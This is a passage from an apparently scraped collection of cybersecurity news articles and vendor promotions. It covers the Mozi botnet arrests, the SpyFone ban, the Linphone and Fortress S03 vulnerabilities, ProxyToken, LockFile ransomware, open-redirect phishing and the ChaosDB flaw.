ever-increasing number of cyberattacks. Traditional NDR solutions need to mirror the complete network traffic though to analyse packet payloads, which is no longer effective in preventing modern cyber threats that leverage encryption to conceal their activities. In addition, mirroring the complete network traffic is becoming increasingly inconvenient, especially with the massive rise of data volume passing through corporate networks. A future-proof NDR like ExeonTrace that relies on the analysis of metadata allows to mitigate those downsides – and should therefore be the mean of choice to protect corporate networks efficiently and effectively.\n\n\nFound this article interesting?

'text': 'The operators of the Mozi IoT botnet have been taken into custody by Chinese law enforcement authorities, nearly two years after the malware emerged on the threat landscape in September 2019.\nNews of the arrest, which originally happened in June, was disclosed by researchers from Netlab, the network research division of Chinese internet security company Qihoo 360, earlier this Monday, detailing its involvement in the operation.\n\n“Mozi uses a P2P [peer-to-peer] network structure, and one of the ’advantages’ of a P2P network is that it is robust, so even if some of the nodes go down, the whole network will carry on, and the remaining nodes will still infect other vulnerable devices, that is why we can still see Mozi spreading,“ said Netlab, which spotted the botnet for the first time in late 2019.\nThe development also comes less than two weeks after Microsoft Security Threat Intelligence Center revealed the botnet’s new capabilities that enable it to interfere with the web traffic of infected systems via techniques such as DNS spoofing and HTTP session hijacking with the goal of redirecting users to malicious domains.\n\nMozi, which evolved from the source code of several known malware families such as Gafgyt, Mirai, and IoT Reaper, amassed more than 15,800 unique command-and-control nodes as of April 2020, up from 323 nodes in December 2019, according to a report from Lumen’s Black Lotus Labs, a number that has since ballooned to 1.5 million, with China and India accounting for the most infections.\nExploiting the use of weak and default remote access passwords as well as through unpatched vulnerabilities, the botnet propagates by infecting routers and digital video recorders to co-opt the devices into an IoT botnet, which could be abused for launching distributed denial-of-service (DDoS) attacks, data exfiltration, and payload execution.\n\nNow according to Netlab, the Mozi authors also packed in additional upgrades, which includes a mining trojan that spreads in a worm-like fashion through weak FTP and SSH passwords, expanding on the botnet’s features by following a plug-in like approach to designing custom tag commands for different functional nodes. “This convenience is one of the reasons for the rapid expansion of the Mozi botnet,“ the researchers said.\nWhat’s more, Mozi’s reliance on a BitTorrent-like Distributed Hash Table (DHT) to communicate with other nodes in the botnet instead of a centralized command-and-control server allows it to function unimpeded, making it difficult to remotely activate a kill switch and render the malware ineffective on compromised hosts.\n“The Mozi botnet samples have stopped updating for quite some time, but this does not mean that the threat posed by Mozi has ended,“ the researchers cautioned. “Since the parts of the network that are already spread across the Internet have the ability to continue to be infected, new devices are infected every day.“\n\n\nFound this article interesting?

'text': 'The U.S. Federal Trade Commission on Wednesday banned a stalkerware app company called SpyFone from the surveillance business over concerns that it stealthily harvested and shared data on people’s physical movements, phone use, and online activities that were then used by stalkers and domestic abusers to monitor potential targets.\n“SpyFone is a brazen brand name for a surveillance business that helped stalkers steal private information,“ said Samuel Levine, acting director of the FTC’s Bureau of Consumer Protection, in a statement. “The stalkerware was hidden from device owners, but was fully exposed to hackers who exploited the company’s slipshod security. This case is an important reminder that surveillance-based businesses pose a significant threat to our safety and security.“\n\nCalling out the app developers for its lack of basic security practices, the agency has also ordered SpyFone to delete the illegally harvested information and notify device owners that the app had been secretly installed on their phones.\nSpyFone’s website advertises the company as the “World’s Leading Spy Phone App,“ and claims five million installations. Like other stalkerware services, SpyFone allowed purchasers to surreptitiously track photos, text messages, emails, internet browsing histories, real-time GPS locations, and other personal information stored in the devices, with the apps equipped with features that make it possible to remove the app’s icon from appearing on the mobile device’s home screen so as to hide the fact that the victim is being monitored.\nOn top of that, the company is said to have not implemented adequate protections to secure amassed data, thus leaving the personal information it stored unencrypted, in addition to exposing the data over the internet without any authentication and transmitting purchasers’ passwords in plaintext. Notably, the company suffered a data breach in August 2018 after a researcher accessed the company’s poorly-protected Amazon S3 bucket and obtained the personal data of roughly 2,200 consumers.\n\nThe development comes almost two years after the FTC barred Retina-X and its developers from selling stalkerware apps that were illegitimately used to spy on employees and children and installed on the victims’ devices without their knowledge or permission by circumventing smartphone manufacturer restrictions, thereby exposing the devices to security vulnerabilities and likely invalidated manufacturer warranties.\n\n\nFound this article interesting?

{'title': 'Cybercriminals Abusing Internet-Sharing Services to Monetize Malware Campaigns',
'text': 'Threat actors are capitalizing on the growing popularity of proxyware platforms like Honeygain and Nanowire to monetize their own malware campaigns, once again illustrating how attackers are quick to repurpose and weaponize legitimate platforms to their advantage.\n“Malware is currently leveraging these platforms to monetize the internet bandwidth of victims, similar to how malicious cryptocurrency mining attempts to monetize the CPU cycles of infected systems,“ researchers from Cisco Talos said in a Tuesday analysis. “In many cases, these applications are featured in multi-stage, multi-payload malware attacks that provide adversaries with multiple monetization methods.“\n\nProxyware, also called internet-sharing applications, are legitimate services that allow users to carve out a percentage of their internet bandwidth for other devices, often for a fee, through a client application offered by the provider, enabling other customers to access the internet using the internet connections offered by nodes on the network. For consumers, such services are “advertised as a means to circumvent geolocation checks on streaming or gaming platforms while generating some income for the user offering up their bandwidth,“ the researchers explained.\n\nBut the illicit use of proxyware also introduces a multitude of risks in that they could permit threat actors to obfuscate the source of their attacks, thereby not only giving them the ability to perform malicious actions by making it appear as if they are originating from legitimate residential or corporate networks, but also render ineffective conventional network defenses that rely on IP-based blocklists.\n“The same mechanisms currently used to monitor and track Tor exit nodes, ’anonymous’ proxies, and other common traffic obfuscation techniques do not currently exist for tracking nodes within these proxyware networks,“ the researchers noted.\n\nThat’s not all. Researchers identified several techniques adopted by bad actors, including trojanized proxyware installers that allow for stealthy distribution of information stealers and remote access trojans (RATs) without the victims’ knowledge. In one instance observed by Cisco Talos, attackers were found using the proxyware applications to monetize victims’ network bandwidth to generate revenue as well as exploit the compromised machine’s CPU resources for mining cryptocurrency.\n\nAnother case involved a multi-stage malware campaign that culminated in the deployment of an info-stealer, a cryptocurrency mining payload, as well as proxyware software, underscoring the “varied approaches available to adversaries,“ who can now go beyond cryptojacking to also plunder valuable data and monetize successful infections in other ways.\n\nEven more concerningly, researchers detected malware that was used to silently install Honeygain on infected systems, and register the client with the adversary’s Honeygain account to profit off the victim’s internet bandwidth. This also means that an attacker can sign up for multiple Honeygain accounts to scale their operation based on the number of infected systems under their control.\n“For organizations, these platforms pose two essential problems: The abuse of their resources, eventually being blocklisted due to activities they don’t even control and it increases organizations’ attack surface, potentially creating an initial attack vector directly on the endpoint,’’ the researchers concluded. “Due to the various risks associated with these platforms, it is recommended that organizations consider prohibiting the use of these applications on corporate assets.“\n\n\nFound this article interesting?

{'title': 'Linphone SIP Stack Bug Could Let Attackers Remotely Crash Client Devices',
'text': 'Cybersecurity researchers on Tuesday disclosed details about a zero-click security vulnerability in the Linphone Session Initiation Protocol (SIP) stack that could be remotely exploited without any action from a victim to crash the SIP client and cause a denial-of-service (DoS) condition.\nTracked as CVE-2021-33056 (CVSS score: 7.5), the issue concerns a NULL pointer dereference vulnerability in the “belle-sip“ component, a C-language library used to implement SIP transport, transaction, and dialog layers, with all versions prior to 4.5.20 affected by the flaw. The weakness was discovered and reported by industrial cybersecurity company Claroty.\n\nLinphone is an open-source and cross-platform SIP client with support for voice and video calls, end-to-end encrypted messaging, and audio conference calls, among others. SIP, on the other hand, is a signaling protocol used for initiating, maintaining, and terminating real-time multimedia communication sessions for voice, video, and messaging applications over the internet.\nTo that end, the remotely exploitable vulnerability can be activated by adding a malicious forward slash (“</“) to a SIP message header such as To (the call recipient), From (initiator of the call), or Diversion (redirect the destination endpoint), resulting in a crash of the SIP client application that uses the belle-sip library to handle and parse SIP messages.\n“The underlying bug here is that non-SIP URIs are accepted as valid SIP header values,“ Claroty researcher Sharon Brizinov said in a write-up. “Therefore, a generic URI such as a simple single forward slash will be considered a SIP URI. This means that the given URI will not contain a valid SIP scheme (scheme will be NULL), and so when the [string] compare function is called with the non-existent scheme (NULL), a null pointer dereference will be triggered and crash the SIP client.“\n\nIt’s worth noting that the flaw is also a zero-click vulnerability as it’s possible to cause the SIP client to crash simply by sending an INVITE SIP request with a specially-crafted From/To/Diversion header. As a consequence, any application that uses belle-sip to analyze SIP messages will be rendered unavailable upon receiving a malicious SIP “call.“\nAlthough the patches are available for the core protocol stack, it’s essential that the updates are applied downstream by vendors that rely on the affected SIP stack in their products.\n“Successful exploits targeting IoT vulnerabilities have demonstrated they can provide an effective foothold onto enterprise networks,“ Brizinov said. “A flaw in a foundational protocol such as the SIP stack in VoIP phones and applications can be especially troublesome given the scale and reach shown by attacks against numerous other third-party components used by developers in software projects.“\n\n\nFound this article interesting?

{'title': '[LIVE WEBINAR] How Lean Security Teams Can Improve Their Time to Response',
'text': 'Cybersecurity could be described as a marathon for security teams that spend most of their time building sustained defenses that prevent threats day after day. However, they must be ready to hit a sprint whenever an attack succeeds since attack duration, and the resulting damages are directly correlated. \nReacting to a successful attack is a major challenge for lean security teams today since speed tends to be a result of size. Large teams with abundant resources can respond to incidents much faster as they can expend those resources freely. Lean security teams face the same costs and resource needs but with a much smaller pool to call from. A new live webinar by XDR provider Cynet shows why that doesn’t have to be the case (register here). \nThe webinar breaks down how even large enterprises struggle with time to response. Look at any of the major breaches of the past years and you’ll find large security teams that overlooked red flags or mishandled their incident response. It’s not all about size, but about understanding the factors that impact your time to response. \nFrom Delay to Disaster\nCyber-attacks happen fast, and there’s little time to waste in responding. Most attackers today need no more than a few hours to infiltrate an organization and wreak havoc successfully. Time to response plays a key role in how much damage organizations avoid from an attack. \nThis includes everything from identifying the attack to investigating forensics, as well as eradicating the attack. \nThe longer attacks persist, the higher the reputational damage to an organization, and the more operations are disrupted, revenues lost, and legal liabilities expand. \nThat’s not even accounting for the cost of resolving the incident itself. Speeding time to response is a crucial priority, but the challenges to surmount are significant. Organizations must have 360-degree visibility in their environment, as well as the ability to correlate copious amounts of data and evidence to detect and root out threats. More importantly, it needs the resources and planning to effectively adapt to the situation and respond to a threat quickly. \nSpeeding Up Your Response \nWhen the rubber hits the road in incident response, most teams find a common factor in delays – a lack of coordination. From missed assignments, lack of role clarity, no chain of command or communication, and more, organizations just don’t work together effectively and efficiently.\nThe webinar will discuss:\nWhy effective incident response starts with having a clear, easy-to-follow incident response plan. A good plan removes the uncertainty from the process and establishes who is doing what, and how. What goes into an effective incident response plan? No matter what incident response model you follow, there are elements that go into any successful plan. These include understanding elements such as preparation, identification, containment, recovery, and eradication. How having the right tools helps optimize your time to response. More than just a plan, you need an infrastructure to support your team. This includes detection and response tools, as well as the ability to view your environment in a single pane of glass. \nYou can register here to save a seat today. \n\n\nFound this article interesting?

'text': 'New vulnerabilities have been discovered in Fortress S03 Wi-Fi Home Security System that could be potentially abused by a malicious party to gain unauthorized access with an aim to alter system behavior, including disarming the devices without the victim’s knowledge.\nThe two unpatched issues, tracked under the identifiers CVE-2021-39276 (CVSS score: 5.3) and CVE-2021-39277 (CVSS score: 5.7), were discovered and reported by cybersecurity firm Rapid7 in May 2021 with a 60-day deadline to fix the weaknesses.\n\nThe Fortress S03 Wi-Fi Home Security System is a do-it-yourself (DIY) alarm system that enables users to secure their homes and small businesses from burglars, fires, gas leaks, and water leaks by leveraging Wi-Fi and RFID technology for keyless entry. The company’s security and surveillance systems are used by “thousands of clients and continued customers,“ according to its website.\nCalling the vulnerabilities “trivially easy to exploit,“ Rapid7 researchers noted CVE-2021-39276 concerns an unauthenticated API Access that enables an attacker in possession of a victim’s email address to query the API to leak the device’s International Mobile Equipment Identity (IMEI) number, which also doubles up as the serial number. Armed with the device’s IMEI number and the email address, the adversary can proceed to make a number of unauthorized changes, such as disabling the alarm system via an unauthenticated POST request.\n\nCVE-2021-39277, on the other hand, relates to an RF Signal replay attack, wherein a lack of adequate encryption grants the bad actor the ability to capture the radio frequency command and control communications over the air using a software-defined radio (SDR), and playback the transmission to perform specific functions, such as “arm“ and “disarm“ operations, on the target device.\n“For CVE-2021-39276, an attacker with the knowledge of a Fortress S03 user’s email address can easily disarm the installed home alarm without that user’s knowledge,“ the researchers said in a report shared with The Hacker News.\n“CVE-2021-39277 presents similar problems, but requires less prior knowledge of the victim, as the attacker can simply stake out the property and wait for the victim to use the RF-controlled devices within radio range. The attacker can then replay the ’disarm’ command later, without the victim’s knowledge.“\n\nRapid7 said it notified Fortress Security of the bugs on May 13, 2021, only for the company to close the report 11 days later on May 24. We have reached out to Fortress Security for comment, and we will update the story if we hear back.\nIn light of the fact that the issues continue to persist, it’s recommended that users configure their alarm systems with a unique, one-time email address to work around the IMEI number exposure.\n“For CVE-2021-39277, there seems to be very little a user can do to mitigate the effects of the RF replay issues absent a firmware update to enforce cryptographic controls on RF signals. Users concerned about this exposure should avoid using the key fobs and other RF devices linked to their home security systems,“ the researchers said.\n\n\nFound this article interesting?

{'title': 'Researchers Propose Machine Learning-based Bluetooth Authentication Scheme',
'text': 'A group of academics has proposed a machine learning approach that uses authentic interactions between devices in Bluetooth networks as a foundation to handle device-to-device authentication reliably.\nCalled “Verification of Interaction Authenticity“ (aka VIA), the recurring authentication scheme aims to solve the problem of passive, continuous authentication and automatic deauthentication once two devices are paired with one another, which remain authenticated until an explicit deauthentication action is taken, or the authenticated session expires.\n“Consider devices that pair via Bluetooth, which commonly follow the pattern of pair once, trust indefinitely. After two devices connect, those devices are bonded until a user explicitly removes the bond. This bond is likely to remain intact as long as the devices exist, or until they transfer ownership,“ Travis Peters, one of the co-authors of the study, said.\n\n“The increased adoption of (Bluetooth-enabled) IoT devices and reports of the inadequacy of their security makes indefinite trust of devices problematic. The reality of ubiquitous connectivity and frequent mobility gives rise to a myriad of opportunities for devices to be compromised,“ Peters added.\nAuthentication is a process to verify that an individual or a system is, in fact, who or what it claims to be. While authentication can also be achieved by identification — something who you are — the latest research approaches it from a verification perspective in that it aims to validate that apps and devices interact in a manner that’s consistent with their prior observations. In other words, the device’s interaction patterns act as a barometer of its overall behavior.\nTo this end, the recurring validation of interaction patterns allows for authenticating the device by cross-checking the device’s behavior against a previously learned machine learning model that represents typical, trustworthy interactions, with the first authentication factor being the use of traditional Bluetooth identifiers and credentials.\n“For example, a user that has a blood-pressure device may really only care if a blood-pressure monitor device is ’hooked up’ to the measurement app, and is operating in a way that is consistent with how a blood-pressure monitor should operate,“ the researchers outlined.\n“Presumably, so long as these properties hold, there is no immediate or obvious threat. If, however, a device connects as a blood-pressure monitor and then goes on to interact in a way that is inconsistent with typical interactions for this type of device, then there may be cause for concern.“\n\nVIA works by extracting features from packet headers and payloads and comparing them to a verification model to corroborate whether the ongoing interactions are consistent with this known authentic behavioral model, and if so, permit the devices to continue communicating with each other. As a consequence, any deviation from authentic interactions will result in failed verification, allowing devices to take steps to mitigate any future threat.\nThe model is constructed using a combination of features, such as n-grams built from deep packet inspection, protocol identifiers and packet types, packet lengths, and packet directionality. The dataset consists of a collection of 300 Bluetooth HCI network traces that capture interactions between 20 distinct smart health and smart home devices and 13 different smartphone apps installed on a Nexus 5 smartphone running Android 6.0.1.\n“We see VIA’s recurring verification of interaction patterns as a sort of second factor for authenticating the device,“ the researchers said. “As a result of this scheme, we introduce the notion of recurring behavioral authentication for Bluetooth connections, which can be integrated into a Bluetooth gateway device, such as a smartphone.“\n\n\nFound this article interesting?

'text': 'The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday added single-factor authentication to the short list of “exceptionally risky“ cybersecurity practices that could expose critical infrastructure as well as government and the private sector entities to devastating cyberattacks.\nSingle-factor authentication is a method of signing in users to websites and remote systems by using only one way of verifying their identity, typically a combination of username and password. It’s considered to be of low-security, since it heavily relies on “matching one factor — such as a password — to a username to gain access to a system.“\n\nBut with weak, reused, and common passwords posing a grave threat and emerging a lucrative attack vector, the use of single-factor authentication can lead to unnecessary risk of compromise and increase the possibility of account takeover by cybercriminals.\nWith the latest development, the list of bad practices now encompasses —\nUse of unsupported (or end-of-life) softwareUse of known/fixed/default passwords and credentials, andUse of single-factor authentication for remote or administrative access to systems\n“Although these Bad Practices should be avoided by all organizations, they are especially dangerous in organizations that support Critical Infrastructure or National Critical Functions,“ CISA said.\n“The presence of these Bad Practices in organizations that support Critical Infrastructure or NCFs is exceptionally dangerous and increases risk to our critical infrastructure, on which we rely for national security, economic stability, and life, health, and safety of the public,“ the agency noted.\n\nFurthermore, CISA is considering adding a number of other practices to the catalog, including —\nUsing weak cryptographic functions or key sizesFlat network topologiesMingling of IT and OT networksEveryone’s an administrator (lack of least privilege)Utilization of previously compromised systems without sanitizationTransmission of sensitive, unencrypted / unauthenticated traffic over uncontrolled networks, andPoor physical controls\n\n\nFound this article interesting?

'text': 'Details have emerged about a now-patched security vulnerability impacting Microsoft Exchange Server that could be weaponized by an unauthenticated attacker to modify server configurations, thus leading to the disclosure of Personally Identifiable Information (PII).\nThe issue, tracked as CVE-2021-33766 (CVSS score: 7.3) and coined “ProxyToken,“ was discovered by Le Xuan Tuyen, a researcher at the Information Security Center of Vietnam Posts and Telecommunications Group (VNPT-ISC), and reported through the Zero-Day Initiative (ZDI) program in March 2021.\n\n“With this vulnerability, an unauthenticated attacker can perform configuration actions on mailboxes belonging to arbitrary users,“ the ZDI said Monday. “As an illustration of the impact, this can be used to copy all emails addressed to a target and account and forward them to an account controlled by the attacker.“\nMicrosoft addressed the issue as part of its Patch Tuesday updates for July 2021.\nThe security shortcoming resides in a feature called Delegated Authentication, which refers to a mechanism whereby the front-end website — the Outlook web access (OWA) client — passes authentication requests directly to the back-end when it detects the presence of a SecurityToken cookie.\n\nHowever, since Exchange has to be specifically configured to use the feature and have the back-end carry out the checks, it leads to a scenario in which the module handling this delegation (“DelegatedAuthModule“) isn’t loaded under default configuration, culminating in a bypass as the back-end fails to authenticate incoming requests based on the SecurityToken cookie.\n“The net result is that requests can sail through, without being subjected to authentication on either the front or back end,“ ZDI’s Simon Zuckerbraun explained.\n\nThe disclosure adds to a growing list of Exchange Server vulnerabilities that have come to light this year, including ProxyLogon, ProxyOracle, and ProxyShell, which have been actively exploited by threat actors to take over unpatched servers, deploy malicious web shells and file-encrypting ransomware such as LockFile.\nTroublingly, in-the-wild exploit attempts abusing ProxyToken have already been recorded as early as August 10, according to NCC Group security researcher Rich Warren, making it imperative that customers move quickly to apply the security updates from Microsoft.\n\n\nFound this article interesting?

{'title': 'How Does MTA-STS Improve Your Email Security?',
'text': 'Simple Mail Transfer Protocol or SMTP has easily exploitable security loopholes. Email routing protocols were designed in a time when cryptographic technology was at a nascent stage (e.g., the de-facto protocol for email transfer, SMTP, is nearly 40 years old now), and therefore security was not an important consideration. \nAs a result, in most email systems encryption is still opportunistic, which implies that if the opposite connection does not support TLS, it gets rolled back to an unencrypted one delivering messages in plaintext. \nTo mitigate SMTP security problems, MTA-STS (Mail Transfer Agent Strict Transport Security) is the recommended email authentication standard. It enforces TLS in order to allow MTAs to send emails securely. This means that it will only allow mail from MTAs that support TLS encryption, and it will only allow mail to go to MX hosts that support TLS encryption.\nIn case an encrypted connection cannot be negotiated between communicating SMTP servers, the email is not sent, instead of being sent over an unencrypted connection. \nAnalyzing the risks involved in transferring emails over an unencrypted SMTP connection\nSTARTTLS is a communication protocol extension to the SMTP email transfer protocol that allows both the communication partners to upgrade an unencrypted communication to encrypted communication. This backward-compatible security implementation was retrofitted into SMTP to ensure that all clients can connect with some level of encryption. When SMTP was first created in the 1980s, it didn’t have any security measures to ensure the communication between mail servers was sent in an encrypted form—it just sent mail as plain text.\nA known vulnerability in the protocol design of the SMTP can be exploited to downgrade a connection easily. Since SMTP was not designed to be encrypted, the upgrade for encrypted delivery is performed by sending an unencrypted STARTTLS command. This enables a Man-in-the-middle attacker to tamper with the STARTTLS command, thereby downgrading the TLS-encrypted connection to an unencrypted one. This forces the email client to fall back to sending information in plaintext. The attacker can then easily access and eavesdrop on the decrypted information.\nCyber Eavesdropping attacks like MITM can jeopardize sensitive information exchanged between officials of an organization, leading to the leakage of company databases and login credentials. \nHow to Ensure TLS Encryption with MTA-STS? \nMTA-STS makes TLS encryption mandatory in SMTP, which ensures that messages are not sent over an unsecured connection, or delivered in plaintext. This in turn keeps Man-in-the-middle and DNS spoofing attacks at bay by stopping attackers from intercepting email communications. \nPowerDMARC’s hosted MTA-STS services help eliminate the complications that come with adopting the protocol, by making the overall process easy for domain owners. \nOur hosted MTA-STS provides domain owners with the following benefits: \nWe host and manage the policy files and certificates on your behalfAdopting the protocol is as easy as publishing a few DNS CNAME records, making it effortless and speedyA dedicated dashboard to manage and modify the protocol configurations that enable you to make changes to your MTA-STS record without having to access your DNSPowerDMARC’s hosted MTA-STS services meet the RFC compliance requirements as well as the current TLS standards \nWhat concerns domain owners after implementing MTA-STS is how to get alerted during situations where an encrypted connection cannot be negotiated and messages fail to get delivered. However, keeping this issue in mind experts curated SMTP TLS reporting, a mechanism that notifies you of delivery issues. \nHow to View and Manage Your TLS Reports? \n\nTLS-RPT allows you to get notified of email delivery failure on TLS encrypted channels; it analyzes and reports all possible issues within those channels, allowing you to react to a TLS issue and deliver a message back without any delay. It is an excellent addition to MTA-STS as it addresses the concern pertaining to emails getting lost during transfer. \nPowerDMARC’s hosted TLS-RPT services:\nGives you access to a dedicated dashboard that automatically parses your TLS reports (originally sent in JSON format), to make them simple and human-readable TLS-RPT data is organized into tables, with actionable buttons and icons for ease of use and navigation Furthermore, your reports are assorted into two separate viewing formats: per sending source and per result, for better visibility and clarity, and an enhanced user experience.\nPowerDMARC helps you deploy and manage email authentication solutions like DMARC, SPF, DKIM, BIMI, MTA-STS, and TLS-RPT, under a single roof without having to deploy them separately for your domain! \nTo avail the benefits of email authentication at your organization, and combat the risk of phishing, spoofing, ransomware, and MITM attacks, sign up for a free DMARC Analyzer today!\n\n\nFound this article interesting?

'text': 'A new ransomware family that emerged last month comes with its own bag of tricks to bypass ransomware protection by leveraging a novel technique called “intermittent encryption.“\nCalled LockFile, the operators of the ransomware have been found exploiting recently disclosed flaws such as ProxyShell and PetitPotam to compromise Windows servers and deploy file-encrypting malware that scrambles only every alternate 16 bytes of a file, thereby giving it the ability to evade ransomware defences.\n\n“Partial encryption is generally used by ransomware operators to speed up the encryption process and we’ve seen it implemented by BlackMatter, DarkSide and LockBit 2.0 ransomware,“ Mark Loman, Sophos director of engineering, said in a statement. “What sets LockFile apart is that, unlike the others, it doesn’t encrypt the first few blocks. Instead, LockFile encrypts every other 16 bytes of a document.“\n“This means that a file such as a text document remains partially readable and looks statistically like the original. This trick can be successful against ransomware protection software that relies on inspecting content using statistical analysis to detect encryption,“ Loman added.\nSophos’ analysis of LockFile comes from an artifact that was uploaded to VirusTotal on August 22, 2021.\nOnce deposited, the malware also takes steps to terminate critical processes associated with virtualization software and databases via the Windows Management Interface (WMI), before proceeding to encrypt critical files and objects, and display a ransomware note that bears stylistic similarities with that of LockBit 2.0.\n\nThe ransom note also urges the victim to contact a specific email address “contact@contipauper.com,“ which Sophos suspects could be a derogatory reference to a competing ransomware group called Conti.\n\nWhat’s more, the ransomware deletes itself from the system post successful encryption of all the documents on the machine, meaning that “there is no ransomware binary for incident responders or antivirus software to find or clean up.“\n“The message here for defenders is that the cyberthreat landscape never stands still, and adversaries will quickly seize every possible opportunity or tool to launch a successful attack,“ Loman said.\nThe disclosure comes as the U.S. Federal Bureau of Investigation (FBI) released a Flash report detailing the tactics of a new Ransomware-as-a-Service (RaaS) outfit known as Hive, consisting of a number of actors who are using multiple mechanisms to compromise business networks, exfiltrate data and encrypt data on the networks, and attempt to collect a ransom in exchange for access to the decryption software.\n\n\nFound this article interesting?

{'title': 'Microsoft Warns of Widespread Phishing Attacks Using Open Redirects',
'text': 'Microsoft is warning of a widespread credential phishing campaign that leverages open redirector links in email communications as a vector to trick users into visiting malicious websites while effectively bypassing security software.\n“Attackers combine these links with social engineering baits that impersonate well-known productivity tools and services to lure users into clicking,“ Microsoft 365 Defender Threat Intelligence Team said in a report published this week.\n\n“Doing so leads to a series of redirections — including a CAPTCHA verification page that adds a sense of legitimacy and attempts to evade some automated analysis systems — before taking the user to a fake sign-in page. This ultimately leads to credential compromise, which opens the user and their organization to other attacks.“\nAlthough redirect links in email messages serve a vital tool to take recipients to third-party websites or track click rates and measure the success of sales and marketing campaigns, the same technique can be abused by adversaries to redirect such links to their own infrastructure, at the same time keeping the trusted domain in the full URL intact to evade analysis by anti-malware engines, even when users attempt to hover on links to check for any signs of suspicious content.\n\nIn order to lead potential victims to phishing sites, the redirect URLs embedded in the message are set up using a legitimate service, while the final actor-controlled domains contained in the link leverage top-level domains .xyz, .club, .shop, and .online (e.g. “c-tl[.]xyz“), but which are passed as parameters so as to sneak past email gateway solutions.\nMicrosoft said it observed at least 350 unique phishing domains as part of the campaign — another attempt to obscure detection — underscoring the campaign’s effective use of convincing social engineering lures that purport to be notification messages from apps like Office 365 and Zoom, a well-crafted detection evasion technique, and a durable infrastructure to carry out the attacks.\n\n“This not only shows the scale with which this attack is being conducted, but it also demonstrates how much the attackers are investing in it, indicating potentially significant payoffs,“ the researchers said.\nTo give the attack a veneer of authenticity, clicking the specially-crafted link redirects the users to a malicious landing page that employs Google reCAPTCHA to block any dynamic scanning attempts. Upon completion of the CAPTCHA verification, the victims are displayed a fraudulent login page mimicking a known service like Microsoft Office 365, only to swipe their passwords upon submitting the information.\n“This phishing campaign exemplifies the perfect storm of [social engineering, detection evasion, and a large attack infrastructure] in its attempt to steal credentials and ultimately infiltrate a network,“ the researchers noted. “And given that 91% of all cyberattacks originate with email, organizations must therefore have a security solution that will provide them multi-layered defense against these types of attacks.“\n\n\nFound this article interesting?

'text': 'Google and Microsoft said they are pledging to invest a total of $30 billion in cybersecurity advancements over the next five years, as the U.S. government partners with private sector companies to address threats facing the country in the wake of a string of sophisticated malicious cyber activity targeting critical infrastructure, laying bare the risks to data, organizations, and governments worldwide.\nThe White House cybersecurity meeting, which brought together executives from the education, energy, finance, insurance, and tech sectors, included companies like ADP, Amazon, Apple, Bank of America, Code.org, Girls Who Code, Google, IBM, JPMorgan Chase, Microsoft, and Vantage Group, among others.\n\nTo that end, the U.S. government on Wednesday announced a collaboration between the National Institute of Standards and Technology (NIST) and industry partners to develop a new framework to improve the security and integrity of the technology supply chain, alongside plans to expand the Industrial Control Systems Cybersecurity Initiative to secure natural gas pipelines. \nThe big tech sector is also rallying behind with a roster of initiatives, including —\nMicrosoft will invest $20 billion over the next five years to deliver advanced security solutions, in addition to making available $150 million in technical services to help federal, state, and local governments with upgrading security protections.Google will invest over $10 billion to bolster cybersecurity, including expanding zero-trust programs, helping secure the software supply chain and enhancing open-source security. It’s worth noting that the search giant, earlier this June, announced a framework called the Supply chain Levels for Software Artifacts (SLSA or “salsa“) to safeguard the integrity of software supply chains.Apple will work with more than 9,000 of its suppliers to push for mass adoption of multi-factor authentications, vulnerability remediation, event logging, and security training.IBM will train 150,000 people in cybersecurity skills over the next three years, and will partner with 20 Historically Black Colleges & Universities to establish a more diverse cyber workforce.Amazon will make available to all Amazon Web Services account holders a multi-factor authentication device to protect against phishing and password theft at no extra cost.\n\nWhile it remains to be seen how these efforts will unfold in practice, the commitments demonstrate the urgency in prioritizing and elevating cybersecurity after a relentless stretch of high-profile cyber attacks targeting SolarWinds, Microsoft, Colonial Pipeline, JBS, and Kaseya in recent months. The incidents also prompted U.S. President Joe Biden to issue an executive order in May requiring federal agencies to modernize their cybersecurity defenses.\n\n\nFound this article interesting?

'text': 'U.S. technology firm Kaseya has released security patches to address two zero-day vulnerabilities affecting its Unitrends enterprise backup and continuity solution that could result in privilege escalation and authenticated remote code execution.\nThe two weaknesses are part of a trio of vulnerabilities discovered and reported by researchers at the Dutch Institute for Vulnerability Disclosure (DIVD) on July 3, 2021.\n\nThe IT infrastructure management solution provider has addressed the issues in server software version 10.5.5-2 released on August 12, DIVD said. An as-yet-undisclosed client-side vulnerability in Kaseya Unitrends remains unpatched, but the company has published firewall rules that can be applied to filter traffic to and from the client and mitigate any risk associated with the flaw. As an additional precaution, it’s recommended not to leave the servers accessible over the internet.\nAlthough specifics related to the vulnerabilities are sparse, the shortcomings concern an authenticated remote code execution vulnerability as well as a privilege escalation flaw from read-only user to admin on Unitrends servers, both of which hinge on the possibility that an attacker has already gained an initial foothold on a target’s network, making them more difficult to exploit.\n\nThe disclosure comes close to two months after the company suffered a crippling ransomware strike on its VSA on-premises product, leading to the mysterious shutdown of REvil cybercrime syndicate in the following weeks. Kaseya has since shipped fixes for the zero-days that were exploited to gain access to the on-premise servers, and late last month, said it obtained a universal decryptor “to remediate customers impacted by the incident.“\n\n\nFound this article interesting?

'text': 'Cloud infrastructure security company Wiz on Thursday revealed details of a now-fixed Azure Cosmos database vulnerability that could have been potentially exploited to grant any Azure user full admin access to other customers’ database instances without any authorization.\nThe flaw, which grants read, write, and delete privileges, has been dubbed “ChaosDB,“ with Wiz researchers noting that “the vulnerability has a trivial exploit that doesn’t require any previous access to the target environment, and impacts thousands of organizations, including numerous Fortune 500 companies.“\n\nCosmos DB is Microsoft’s proprietary NoSQL database that’s advertised as “a fully managed service“ that “takes database administration off your hands with automatic management, updates and patching.“\nThe Wiz Research Team reported the issue to Microsoft on August 12, after which the Windows maker took steps to mitigate the issue within 48 hours of responsible disclosure, in addition to awarding a $40,000 bounty to the finders on August 17.\n\n“We have no indication that external entities outside the researcher had access to the primary read-write key associated with your Azure Cosmos DB account(s),“ Microsoft said in a statement. “In addition, we are not aware of any data access because of this vulnerability. Azure Cosmos DB accounts with a vNET or firewall enabled are protected by additional security mechanisms that prevent risk of unauthorized access.“\nThe exploit identified by Wiz concerns a chain of vulnerabilities in the Jupyter Notebook feature of Cosmos DB, enabling an adversary to obtain the credentials corresponding to the target Cosmos DB account, including the Primary Key, which provides access to the administrative resources for the database account.\n\n“Using these credentials, it is possible to view, modify, and delete data in the target Cosmos DB account via multiple channels,“ the researchers said. As a consequence, any Cosmos DB asset that has the Jupyter Notebook feature enabled is potentially impacted.\nAlthough Microsoft notified over 30% of Cosmos DB customers about the potential security breach, Wiz expects the actual number to be much higher, given that the vulnerability has been exploitable for months. \n“Every Cosmos DB customer should assume they’ve been 